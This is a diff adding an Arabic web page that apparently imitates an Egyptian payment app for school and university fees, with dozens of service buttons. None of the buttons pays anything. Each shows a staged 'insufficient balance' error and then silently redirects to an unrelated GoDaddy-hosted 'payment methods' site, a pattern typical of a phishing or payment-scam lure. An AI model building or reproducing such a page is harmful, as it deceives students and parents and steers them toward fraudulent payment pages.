@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>خدمات التبرعات والنقابات</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --primary-color: #3a7bd5;
+            --secondary-color: #374151;
+            --accent-color: #f0f4f8;
+            --border-color: #e5e7eb;
+            --danger-color: #ef4444;
+        }
+        * {
+            font-family: 'Cairo', sans-serif;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: var(--accent-color);
+            margin: 0; padding: 0; direction: rtl;
+        }
+
+        /* === Top Bar Styles === */
+        .top-bar {
+            background: linear-gradient(135deg, #3a7bd5, #2e5faa);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            height: 60px; padding: 0 1rem; display: flex; align-items: center;
+            justify-content: space-between; color: white; position: sticky; top: 0; z-index: 900;
+        }
+        .icon-container {
+            background-color: rgba(255, 255, 255, 0.15); border-radius: 8px;
+            width: 40px; height: 40px; cursor: pointer; transition: all 0.3s ease;
+            display: flex; align-items: center; justify-content: center;
+            color: white !important; text-decoration: none; flex-shrink: 0;
+        }
+        .icon-container:hover {
+            background-color: rgba(255, 255, 255, 0.25); transform: scale(1.05);
+        }
+        .top-bar-title {
+            font-weight: 700; flex-grow: 1; text-align: center;
+        }
+        
+        /* === Content Styles === */
+        .content-wrapper {
+            padding: 1rem;
+        }
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1rem;
+        }
+        .service-button {
+            background-color: white; border-radius: 0.75rem;
+            padding: 1rem; cursor: pointer; transition: all 0.3s ease;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.07), 0 2px 4px -2px rgba(0,0,0,0.07);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            text-align: center; border: 1px solid var(--border-color);
+            min-height: 120px;
+        }
+        .service-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1);
+            border-color: var(--primary-color);
+        }
+        .service-button img {
+            width: 40px; height: 40px; margin-bottom: 0.75rem; object-fit: contain;
+        }
+        .service-button span {
+            font-size: 0.875rem; font-weight: 600;
+            line-height: 1.4; color: var(--secondary-color);
+        }
+        
+        /* === Failure Modal === */
+        .modal {
+            position: fixed; inset: 0; background-color: rgba(0, 0, 0, 0.6);
+            display: none; align-items: center; justify-content: center;
+            z-index: 1000;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background-color: var(--accent-color); width: 100%; height: 100%;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            transform: translateY(100%); animation: slideUp 0.3s forwards;
+        }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        
+        .failure-icon {
+            font-size: 4rem; color: var(--danger-color);
+            animation: popIn 0.5s ease-out;
+        }
+        .failure-title {
+            font-size: 1.5rem; font-weight: 700; color: var(--secondary-color);
+            margin-top: 1.5rem; animation: fadeIn 0.5s 0.2s backwards;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Notification Modal */
+        .notification-modal { /* Standard styles here */ }
+    </style>
+</head>
+<body>
+    
+    <div class="top-bar">
+        <a href="#" onclick="history.back(); return false;" class="icon-container"><i class="fas fa-arrow-right"></i></a>
+        <div class="top-bar-title">خدمات التبرعات والنقابات</div>
+        <div class="icon-container" id="notificationIcon"><i class="fas fa-bell"></i></div>
+    </div>
+
+    <div class="content-wrapper">
+        <div class="grid-container">
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>المصروفات الدراسية العام السابق</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>تقسيط المصروفات الدراسية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>تقسيط المصروفات الدراسية العام السابق</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسوم امتحانات وزارة التربية و التعليم</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>خدمة تظلمات الشهادة الثانوية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>دفع غرامة الغياب لأول مرة</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>دفع غرامة الغياب لثانى مرة</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسم اعادة القيد بسبب استنفاذ مرات الرسوب</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>دفع غرامة الإنقطاع عن التعليم الأساسى</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسم امتحان نقل من الخارج لطلاب المنازل</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسم ملف التقديم لطلاب التعليم والتدريب المزدوج</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>تحصيل مصاريف مدارس المتفوقين</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>المدراس اليابانيه - الرسوم الدراسية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>امتحانات المواد القومية لطالب الشهادات الدولية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسوم مهنة الجدارات لطلاب التعليم الفنى</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسوم طلاب دبلوم مدارس التكنولوجيا التطبيقية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مصاريف المدارس - الصفوف الأولي</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مصروفات التعليم الفنى نظام 3 سنوات</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسوم التقدم للمدارس التطبيقية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسوم التقدم لمدارس مراكز التميز</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة حلوان</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مدارس الأورمان</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة 6 اكتوبر</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الدلتا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>كلية الدراسات العليا بالقاهرة</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة بنها</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة طنطا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>معهد الوادى العالى للادارة والمالية ونظم المعلومات</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>معهد الوادي العالي للهندسة و التكنولوجيا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>الغرفة الأمريكية - تعليم عالي</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>الجامعه العربيه المفتوحه</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة عين شمس - مصروفات</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة عين شمس - هندسة عام</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة عين شمس - جمعية خريجي كلية الهندسة</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة القاهرة - المصاريف</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة القاهرة - المدينة الجامعية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة القاهرة - الدراسات العليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة القاهرة - التعليم المفتوح</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة المنصورة - الرسوم</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة المنصورة - المدينة الجامعية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة المنصورة - الدراسات العليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة المنصورة - الساعات المعتمدة</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة بني سويف - المصاريف</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة بني سويف - دراسات عليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة المنيا - الرسوم</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الزقازيق - المصاريف</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الاسكندرية - المصاريف</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة سوهاج - المصاريف</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة بنها - الرسوم</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة بنها - الدراسات العليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الأزهر - الرسوم</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الأزهر - تسجيل المدينة الجامعية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الأزهر - مصاريف المدينة الجامعية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الأزهر - الدراسات العليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة الأزهر - الإسكان الإقتصادي</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة دمياط - الرسوم الدراسية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة دمياط - الدراسات العليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة دمياط - رسوم سكن الطلاب</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة مدينة السادات - الرسوم الدراسية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة جنوب الوادي - المصروفات</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة جنوب الوادي - المدينة الجامعية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة جنوب الوادي - مصروفات الخريجين</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة جنوب الوادي - الدراسات العليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة مدينة السادات - الدراسات العليا</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة اكتوبر للعلوم الحديثة والآداب</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة ميرت - رسوم القبول</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>الجامعة المصرية للتعلم الإلكترونى</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>معهد الإسكندرية للإعلام</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مدرسة الأورمان الذكية للغات</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مدرسة الالسن</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مدرسة الالسن الازهرية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>جامعة دراية - رسوم القبول</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مصاريف معهد الالسن</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>رسوم معهد طيبة للهندسة</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>معهد طيبة العالي للهندسة</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>اكاديمية الدولية للهندسة وعلوم الإعلام</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>معهد طيبة لتكنولوجيا المعلومات الإدارية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>معهد طيبة للحاسبات والعلوم الإدارية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>الجامعة المصرية اليابانية</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>تحصيلات مدرستي</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>خدمة شهادات أمديست</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>معهد طيبة للحاسبات والعلوم الإدارية - خدمات تعليمية ITI</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مدارس 30 يونيو</span></button>
+            <button class="service-button"><img src="https://b.top4top.io/p_3423vpcch1.png" alt="أيقونة"><span>مشيخة الازهر – المصروفات الدراسية</span></button>
+        </div>
+    </div>
+    
+    <div id="failureModal" class="modal">
+        <div class="modal-content">
+            <i class="fas fa-times-circle failure-icon"></i>
+            <h2 class="failure-title">لا يوجد رصيد كافي لاستكمال العملية</h2>
+        </div>
+    </div>
+    
+    <div id="notificationModal" class="notification-modal">
+         </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const failureModal = document.getElementById('failureModal');
+            let redirectTimer;
+
+            document.querySelectorAll('.service-button').forEach(button => {
+                button.addEventListener('click', () => {
+                    // Show the failure modal immediately
+                    failureModal.classList.add('active');
+                    
+                    // Clear any previous timer
+                    clearTimeout(redirectTimer);
+                    
+                    // Set a new timer to redirect after 2.5 seconds
+                    redirectTimer = setTimeout(() => {
+                        window.location.href = 'https://0555491b355041.site.godaddyarabicwsbonline.com/%D8%B7%D8%B1%D9%82-%D8%A7%D9%84%D8%AF%D9%81%D8%B9';
+                    }, 2500);
+                });
+            });
+
+            // Optional: allow closing the modal to cancel the redirect
+            // This requires adding a close button to the modal's HTML
+            window.closeFailureModal = function() {
+                clearTimeout(redirectTimer);
+                failureModal.classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
